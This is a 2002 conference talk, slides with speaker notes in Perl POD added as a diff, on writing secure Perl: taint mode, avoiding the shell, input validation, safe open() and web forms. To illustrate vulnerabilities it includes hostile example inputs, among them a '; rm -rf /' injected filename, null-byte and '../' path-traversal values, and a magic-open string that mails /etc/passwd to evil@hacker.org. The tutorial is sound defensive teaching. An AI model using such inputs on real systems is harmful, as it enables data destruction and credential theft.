@@ -1,0 +1,789 @@
+
+=head1 Writing Secure Perl Programs
+
+S< >
+
+=head2 Peter Haworth
+
+pmh@cpan.org
+
+IOP Publishing Ltd.
+
+S< >
+
+
+O'Reilly Open Source Convention
+July 22-26, 2002
+
+
+
+=head1 Outline
+
+=over 4
+
+=item * Robustness
+
+=item * Tainting
+
+=item * Child processes
+
+=item * Validate all user input
+
+=item * Filenames
+
+=item * Magic open()
+
+=item * Web applications
+
+=item * Safe sequence numbers
+
+=item * Dynamic method names
+
+=back
+
+
+=cut
+
+Here's what I'll be talking about, which you can read for yourselves.
+
+I'm not going to say anything about setting up secure communication
+channels, such as SSL or SSH. This talk is concerned more with
+defending against legitimate users acting stupidly or maliciously.
+
+I only have 45 minutes, so I'm obviously not going to be able to
+cover every possible security issue that you might encounter when
+writing a Perl program. I'm going to try to mention some of the
+more important problems you need to be aware of, and hopefully,
+get you into the right frame of mind to be able to spot some of
+the issues I've missed out.
+
+
+
+=head1 Introduction
+
+=head2 Don't trust the user
+
+=over 4
+
+=item * Implicit trust -> eventual disaster
+
+=item * No trust -> more safety
+
+=back
+
+=cut
+
+If you trust the user to act responsibly, when they eventually do
+something irresponsible, your application will probably let them view
+or modify data they aren't supposed to have access to, or allow them
+to run arbitrary programs on your system.
+
+If you never trust anything the user says or does, you have a much
+better chance of staying secure. Most of this talk is about restricting
+the user's choice to safe options, or how to detect unsafe options if
+the user has free reign to choose what they like.
+
+Note that I only say "more safety," rather than "absolute security." It
+would be foolish to claim absolute security, even if all known
+vulnerabilities are made secure. There's always a possibility of a
+new vulnerability being discovered, or of someone gaining physical
+access to your hardware, or socially engineering your passwords.
+
+
+
+=head1 Robustness
+
+=over 4
+
+=item * C<use strict>
+
+=item * C<use warnings>
+
+=item * Check return codes of system calls
+
+  open STDOUT,'> write-protected';
+
+=item * Handle "impossible cases" explicitly
+
+  if( $x == 1 ){
+    do_this();
+  }elsif( $x == 2 ){
+    do_that();
+  }
+
+=item * C<perl -T>
+
+=back
+
+=cut
+
+Lots of security problems are due to bugs in the software.
+Unfortunately, it's just as foolish to claim "no bugs" as it is to
+claim "absolute security," but there are measures you can take to
+make finding bugs easier.
+
+Perl's strict pragma requires all variables to be declared, and turns
+off poetry mode, which combined, catch many accidental mispellings
+of variable and subroutine names.
+
+The warnings pragma, introduced in Perl 5.005, enables many
+compile-time and runtime warnings, some of which may indicate bugs. All
+versions of perl5 support the -w command line option and $^W variable
+to similar effect.
+
+Most system calls can fail, but their return codes are often
+ignored. This can potentially have a serious effect on security. For
+instance, failing to open a file will actually leave the previous
+file open. In the example here, any data printed to STDOUT will
+go to the program's original output, rather than to the file. Most
+programs do check the status of opening files, but everything after
+that is often just assumed to work. If the secure operation of your
+program relies on files being written to correctly, you should check
+the return status of print(), write(), and even close().
+
+In this example, it may be possible for $x to have a value other than 1
+or 2, but this code doesn't explicitly deal with such a scenario. There
+should be an else clause to this if, resulting in an exception, or
+other appropriate behaviour, even if it's just a comment explaining
+that other values are valid, but don't require special treatment.
+
+Perl's taint mode, enabled with the -T option, is specifically designed
+to detect security problems, and I'll talk about it on the next slide.
+
+
+
+=head1 Tainting
+
+=over 4
+
+=item * Data from external sources is tainted
+
+  $^X  @ARGV  %ENV
+  <>  read()  readline()  `` qx()    etc
+  shmread()  msgrcv()  getpw*()      etc
+
+=item * All data derived from tainted data is also tainted
+
+=item * Tainted data can't affect external sources
+
+  `` qx()  system()  exec()
+  kill()
+  unlink()  mkdir()  umask()  chmod()    etc
+  open() (for writing)  NOT print() or write()
+
+=item * C<$1>, C<$2>, etc are (almost) never tainted
+
+  my($untainted) = $tainted =~ /(\d+)/;
+
+=back
+
+=cut
+
+Taint mode tracks data derived from external sources, such as user
+input, and prevents it from being used to accidentally affect other
+external entities. By "accidentally", I mean scenarios where the
+programmer forgets to check data before using it in potentially
+dangerous ways.  Taint mode is enabled manually with the -T command
+ line switch, or automatically when running setuid/setgid.
+
+All data obtained from external sources is marked as tainted. This
+includes the command line arguments (including the name of the
+perl executable in $^X) and the environment hash, but note that it
+is the elements which are tainted, not the aggregates as a whole.
+Individual elements of @ARGV and %ENV can be updated or added using
+untainted data, and those elements will remain untainted. All data
+read from files or sockets is also marked as tainted.
+
+All expressions involving tainted data result in tainted data. This
+ensures that no matter how values are calculated, if they can be
+influenced in any way by external sources, they are marked as tainted.
+
+If tainted data is used in an expression which affects the outside
+world, an "Insecure dependency" exception is thrown.
+
+Note that taint checking is not done when writing to files, but it does
+cover opening files for writing; creating, renaming and deleting files
+and directories, as well as changing file permissions and ownerships.
+
+Of course, quite often, we do want the user's input to affect external
+entities, so Perl provides a simple way to untaint values. The regex
+capture variables, $1, $2 and so on are always untainted. This forces
+you to validate user input with a regex before treating it as safe,
+but doesn't actually force the use of a safe pattern. Perl will happily
+untaint $1, even if you used .* as your pattern, and treated all values
+as safe. So we'll have a look at validation in a couple of slides.
+
+Actually, if "use locale" is in effect, then regex captures
+are tainted, since locales can affect the meaning of some regex
+metacharacters. Also, the "re" pragma has a 'taint' option which
+causes regex captures to be tainted
+
+
+
+=head1 Child processes
+
+=over 4
+
+=item * Sanitise the environment
+
+  %ENV=( PATH => '/bin:/usr/bin' );
+
+=item * Additional C<%ENV> taint checks
+
+  PATH IFS CDPATH ENV BASH_ENV
+
+=item * Don't invoke the shell
+
+  # Unsafe:    $file eq "; rm -rf /"
+  system "prog $file"      and die;
+
+  # Safe
+  system "prog \Q$file\E"  and die;
+
+  # No shell, and less taint checks (for now)
+  system '/bin/prog',$file and die;
+
+=back
+
+=cut
+
+When you run child processes, environment variables can have a
+significant effect on the interpretation of commands. The best way to
+prevent the user from subverting your child processes is to completely
+wipe the environment, and initialise only those variables which are
+actually needed with known safe values.
+
+Taint mode performs some extra checks on the environment, and throws
+an exception if any of these element are tainted when creating child
+processes. Historically, the list argument forms of system() and exec()
+haven't done any taint checking, since perl assumes that you know what
+you are doing. With version 5.8, the list forms do the same environment
+checking as the string forms, and generate warnings if their arguments
+are tainted. In a future version of perl this will be a fatal error.
+
+The simple ways of running subprocesses in Perl invoke the shell to
+parse the command line if there are any metacharacters in it. If
+the user is able to specify command line arguments containing
+metacharacters, this will allow them to run arbitrary commands,
+which is clearly undesirable. You can escape these characters with
+the inline form of quotemeta(), but that still ends up invoking the
+shell, which is an unnecessary extra process in most cases. To avoid
+the shell, use the list argument form of system() or exec(). These
+simply execute the command with the arguments exactly as supplied,
+so there's no need to escape them.  However, as just mentioned, the
+list form does less taint checking, so be careful!
+
+=head1 Child processes - Safe pipes
+
+=over 4
+
+=item * Unsafe
+
+  open my $fh,"| mail $user" or die;
+  print $fh $msg;
+  close $fh or die;
+
+=item * Safe, but invokes the shell
+
+  open my $fh,"| /bin/mail \Q$user\E" or die;
+  print $fh $msg;
+  close $fh or die;
+
+=item * Safe and efficient
+
+  defined(my $pid=open my $fh,'|-') or die;
+  if(!$pid){
+    exec '/bin/mail',$user;
+    die "Can't exec";
+  }
+  print $fh $msg;
+  close $fh or die;
+
+=item * Perl 5.8.0 - safe and programmer-efficient
+
+  open my $fh,'|-','/bin/mail',$user or die;
+  print $fh $msg;
+  close $fh or die;
+
+=back
+
+=cut
+
+If you need to supply input to a child process, or read its output,
+Perl provides simple ways to do this, but again, not invoking the
+shell makes things more efficient and generally more secure.
+
+The first two examples here are basically the same as the previous
+slide, except that they use open() instead of system() in order to
+provide input to the subprocess.
+
+The third example is somewhat more complicated, since we need to
+explicitly fork and exec, which Perl does for us in the first two
+examples. However, this is essentially the same as the last example
+on the previous slide, using the list argument form of exec() to
+avoid the shell.
+
+Finally, in perl 5.8, the 3 argument form of open() has been extended
+to allow command line arguments to be specified individually, just
+as with the list argument forms of system() and exec(), which makes
+things simpler again.
+
+=head1 Validate all user input
+
+=over 4
+
+=item * Allow safe; don't disallow unsafe
+
+  die "Bad!" if /[;<>&^"']/;     # Bad!
+
+  die "Bad!" unless /\A[\w\s]+\z/; # Good
+
+=item * Check allowed ranges
+
+  my ($num) = $input =~ /\A(\d+)\z/
+    or die "Not an integer";
+
+  $num >= 0 && $num <= 100
+    or die "Out of range";
+
+=item * Make tests consistent
+
+=back
+
+=cut
+
+The range of allowable inputs is usually well defined, and easy
+to specify.  By only explicitly checking for bad inputs, it's
+possible to accidentally miss some out, leaving your application
+vulnerable. Assuming that this "Bad!" regex is supposed to catch
+shell-metacharacters, there are several missing, but these may not
+be immediately apparent to the programmer. The "Good" regex takes
+the opposite approach of specifying which characters are allowed,
+and ends up being much simpler, and easier to verify.
+
+I've used \A and \z rather than ^ and $ to anchor the regex at the
+beginning and end of the string, even with the /m modifier.
+$ can match a newline at the end of the string, even without the /m
+modifier, which you generally don't want when validating input.
+\z was introduced in 5.005, so if you're stuck with 5.004 you'll be
+stuck with $ (or \Z, which only matches at the end of a string, but
+can still match a newline).
+
+Even within the specified format, there may be certain values, such as
+extremely large numbers, which make your application more vulnerable,
+or which cause excessive resources to be reserved. Check that values
+are in range as soon as the user enters them and you'll waste less time
+processing the rest of the request. Note that the example uses a regex
+capture, so $num will be untainted if it is set successfully.
+
+It's important that different parts of your application apply the
+same validation rules to users' input. Otherwise assumptions
+made about the allowed inputs may also differ, leading to
+vulnerabilities. Performing validation in common subroutines make
+this simple, and ensures that the same level of security is applied
+to user input, no matter what the user requests.
+
+
+
+=head1 Filenames
+
+=over 4
+
+=item * Poison null byte
+
+  # Unsafe if $filename eq "/etc/passwd\0"
+  open my $fh, '<', "$filename.safe"
+    or die "Invalid filename";
+
+  # Safer
+  die "Invalid filename"
+    if $filename =~ /\0/;
+  open my $fh, '<', "$filename.safe"
+    or die "Invalid filename";
+
+=item * Don't allow paths
+
+  # Prevents ../../../../etc/passwd
+  die "Invalid filename"
+    if $filename =~ m#/#;
+
+=item * Allow safe; don't disallow unsafe
+
+  die "Invalid filename"
+    unless $filename =~ /\A\w+\z/;
+
+=back
+
+=cut
+
+If you allow users to enter filenames, you need to make sure that
+they can only specify files which they are allowed to access. A
+simple way of doing this is to add a given extension (.safe in
+the example) to all filenames given by the user. Provided that you
+are only opening files for reading, the user should obviously be
+restricted to opening existing files with .safe extensions. However,
+most operating systems use null bytes to signify the end of strings,
+and Perl doesn't. If a user manages to specify a filename containing
+an embedded null, the addition of a .safe extension won't make any
+difference. If that's the only check you make on filenames, you've
+just allowed the user to view every file on your system. Checking
+for null bytes makes the safe extension technique safer, but there
+are better ways of restricting filename choices.
+
+Once you've checked for null bytes, you should consider disallowing
+pathnames to be specified. In most situations, the user only needs
+to specify one of a number of files from a common directory. If you
+disallow the directory separator character, you easily restrict them
+to that one directory.
+
+However, both of these techniques fall into the "disallowing unsafe
+characters" category. We should really be doing a positive check for
+a safe filename, such as one which checks for all word-characters. As
+before, this is a single simple test, which doesn't allow for
+unexpected loopholes.
+
+
+
+
+=head1 Magic C<open()>
+
+=over 4
+
+=item * C<< open FH,$fname; >>
+
+Full magic
+
+  > /etc/passwd
+  mail evil@hacker.org < /etc/passwd |
+
+=item * C<< open FH,"< $fname"; >>
+
+Slightly magical
+
+  -f $fname;   # May be a different file
+
+=item * C<< open FH,"< ./$fname\0"; >>
+
+No magic
+
+=item * C<< my $fh=IO::File->new($fname,'<'); >>
+
+No magic, lexical filehandle
+
+=item * C<< open my $fh,'<',$fname; >>
+
+As above, with perl 5.6.0
+
+=back
+
+=cut
+
+Perl's open() builtin has some highly magical defaults, which can
+open your application to some serious vulnerabilities if you're not
+careful. Disabling this magic is pretty simple, but even so, embedded
+nulls will still affect the filename passed to the operating system.
+
+The traditional two argument form of open() combines the filename
+to be opened and the open mode (whether to read or write) in the
+second argument.  If the first character is '>', the file will be
+opened for writing. If the first or last character is '|', the named
+command will be run as a pipe for writing or reading, respectively.
+If the user has specified a filename with these characteristics,
+they will probably have more access than you wanted. Ideally, a user
+shouldn't be able to specify such a file, but a secure application
+should protect itself at all levels.
+
+Specifying the open mode explicitly removes the risk of the user
+specifying it.  However, there's still some magic going on. Perl will
+remove leading and trailing whitespace from the filename. This can
+be exploited in applications which check that files exist before
+opening them. Since open() is the only operator with this magic,
+specifying a filename with extra spaces could fool an application
+into checking for a different file's existence than the one actually
+opened. In any event, such tests before opening files are usually
+subject to race conditions, and there are better ways.
+
+Specifying the file's path and adding trailing null byte turns off
+all of the above magic. The IO::File module allows the separation
+of filename and open mode, and returns globrefs, which can be used
+to lexically scope your filehandles, ensuring they are automatically
+closed when no longer used. As of Perl version 5.6, the open() builtin
+also allows separation of filename and mode, and also autovivifies
+its first argument, again allowing for lexically scoped filehandles.
+
+
+
+=head1 Web applications - HTML forms
+
+=over 4
+
+=item * Hidden fields aren't secure
+
+  <input type="hidden" name="password"
+    value="secret">
+
+=item * Expect multiple values
+
+  # Unsafe
+  # fname=stuff&fname=action&fname=delete
+  %config = (
+    action => 'create',
+    filename => $cgi->param('fname'),
+  );
+
+  # Safe
+  $sth->execute(
+    scalar $cgi->param('fname')
+  );
+
+=item * Expect the unexpected
+
+=back
+
+=cut
+
+Web applications are usually, by their nature, generally accessible
+to the outside world, and deserve special attention to security. For
+ease of reference, I'm going to call the application which receives
+an HTML form submission as the "receiver".
+
+Hidden fields are a good way of supplying extra information to the
+receiver over that which is displayed to the user. However, the
+user can easily access this information by viewing the source of the
+page. Likewise, they can also write their own HTML form or type in a
+URL which contains different values in the "hidden" fields than the
+receiver might be expecting. Hidden fields aren't secure in either
+direction without some extra work, which I'll talk about on the next
+slide.
+
+Both the CGI module and mod_perl's Apache::Request module define
+a param() method which can be used to query the parameters sent by
+the user. In scalar context, these methods return the first value
+of the requested field, and in list context they return all of its
+values. This is an extremely useful feature, but you need to be
+careful that you're not calling param() in list context when you
+should be using scalar context.
+
+Similarly, the user might send parameters which don't appear on
+the HTML form, or might not send parameters which the form makes
+mandatory. Always validate the entire set of parameters before allowing
+a request to be processed.
+
+
+
+=head1 Web applications - Cookies
+
+=over 4
+
+=item * Mostly like hidden fields
+
+=item * Message digest adds security
+
+  # Standard with perl 5.8.0
+  use Digest::MD5 qw(md5_hex);
+
+  $cookie_val = $val . md5_hex(
+    md5_hex($val . $secret1) . $secret2
+  );
+
+=item * Check expiry dates
+
+=back
+
+=cut
+
+Cookies are very similar to hidden form fields. They are notionally
+invisible to the user, but can be examined and modified by them
+at any point.  This means that you can't use cookies as a secure
+storage mechanism without explicitly making them secure.
+
+Message digests offer a reasonable way of adding security. In
+addition to the usual content, you append a value derived from the
+a combination of the content and a secret value.  Since the user
+doesn't know the secret, they can't modify the cookie without being
+detected. In the example I've actually shown a two stage digest with
+different keys, since the output of some popular digest algorithms
+can be predicted for certain variations of the input.
+
+Because all of the inputs to the digest function (except the secret)
+are visible in the cookie, this method doesn't work for storing
+information the user shouldn't be able to access. That kind of
+information should always be held on the server.
+
+If you set expiry dates on cookies, you should make sure that the
+cookie can't be submitted after it has expired. To achieve this,
+just add the expiry date to the cookie contents before digesting,
+and refuse cookies with expired expiry dates or with bad digests.
+
+
+
+=head1 Safe sequence numbers
+
+=over 4
+
+=item Not like this!
+
+  my $seqn=$dbh->selectrow_array(q(
+    select max(key_field)
+    from table1
+  ));
+
+=item Let the database do it for you
+
+  my $seqn=$dbh->selectall_arrayref(q(
+    select nextval('name_of_sequence')
+  ))->[0][0];
+
+=item Or do it yourself
+
+  sub nextval{
+    my($name)=@_;
+    $name=~/\A\w+\z/       or die "Bad sequence name";
+
+    my $fh=IO::File->new("/path/$name",O_RDWR|O_CREAT)
+                           or die "Can't open: $!";
+    flock $fh,LOCK_EX      or die "Can't lock: $!";
+    chomp(my $next=<$fh>);
+    ++$next;
+    seek $fh,0,0           or die "Can't rewind: $!";
+    print $fh "$next\n"    or die "Can't write: $!";
+    close $fh              or die "Can't close: $!";
+
+    return $next;
+  }
+
+=back
+
+=cut
+
+The first example here is pretty simple - just find the biggest
+existing number, and add one. However, if two processes execute this
+code at the same time, they will both generate the same number. You
+could make this safer by running it in a serialised isolation level,
+but you need to serialise the whole transaction for that to work,
+which won't help performance.
+
+Most databases support sequences directly, as in the second example.
+However, while the first example will generate a contiguous sequence
+of numbers, this example probably won't, due to the nature of
+database sequences. To allow concurrent access to the sequence,
+each database server process may have a section of the sequence
+allocated to it, so sequence numbers may actually go down between
+succesive transactions. Also, sequences aren't rolled back with
+transactions, so you can end up with some numbers which were never
+used in a successful transaction, leaving gaps in the sequence.
+
+If you don't like your database's sequence generator, or you need
+sequence numbers for something other than a database, you can easily
+generate your own, using the third example. This code stores the
+last number to have been generated in a text file, which it locks
+to prevent concurrent access. One advantage of this method is
+that since the generation of the next number is done in perl, you
+aren't restricted to monotonically increasing numbers. Using the
+code above, you could seed the sequence with letters, and perl's
+autoincrement operator will do the right thing. Or you could write
+your own "increment" operation, which generates a Fibonacci sequence
+or which passes the raw sequence number through a message digest
+function to produce a more random-looking sequence.
+
+
+
+=head1 Dynamic method names
+
+=head2 C<< $obj -> $meth () >>
+
+=over 4
+
+=item * Works if C<$meth> is a method name
+
+  my $meth = 'do_stuff';
+  $obj -> $meth ();     # $obj->do_stuff()
+
+=item * Works across packages
+
+  my $meth = 'Other::Pkg::do_stuff';
+  $obj -> $meth ();
+
+=item * Taint checks don't protect
+
+=item * Restrict the user's choice
+
+  if( $meth =~ /\A\w+\z/
+    and my $ref = $obj->can("safe_$meth")
+  ){
+    $obj -> $ref ();
+  }
+
+=back
+
+=cut
+
+In some circumstances, it can be necessary to allow the user to specify
+the methods to be called in an object oriented application. While
+this can be very useful, it is necessary to somewhat limit Perl's
+extreme flexibility in order to keep your application secure.
+
+As well as nonexistent methods, users may specify methods which aren't
+suitable or which would allow more access than appropriate.
+
+Finally, and most dangerously, the user can actually specify a
+method from a completely unrelated package. If a fully qualified
+method name is given, Perl will start looking for a method in the
+named package, rather than the object's package. This is the source
+of the relatively recently publicised vulnerability in the SOAP::Lite
+ module.
+
+Taint checking, since it only protects the outside world from your
+program, has no effect on method lookup, though there has been
+some discussion about taint mode providing some kind of protection
+against this in perl 5.10.
+
+All this means that we have to do our own security checking. First
+of all, we check for a sensible method name. If it's all word
+characters, it can't be in another package. Then we check to
+see whether it actually exists, using the can() method, which
+is available to all objects. Here, I've added a "safe_" prefix,
+which gives a simple way to allow access to any given method -
+just give it an appropriate name. Alternatively, you could store
+the allowed list of methods somewhere, and check against it. Also,
+the can() method returns a reference to the method sub, which is
+more efficient to use than the name.
+
+The SOAP::Lite vulnerability was fixed in version 0.55 just by adding
+a check for sensible method names as in the example.
+
+
+
+=head1 References
+
+=over 4
+
+=item http://www.dwheeler.com/secure-programs/
+
+Secure programming for Linux/Unix
+
+=item S< >
+
+=item http://www.w3.org/Security/Faq/
+
+WWW Security FAQ
+
+=item S< >
+
+=item C<perldoc perlsec>
+
+Perl documentation on tainting
+
+=item S< >
+
+=item $CPAN/authors/id/P/PM/PMH/secprog-tpc2002.tgz
+
+Latest version of these slides and speaker's notes
+
+=back
+
+
+
+
+
+
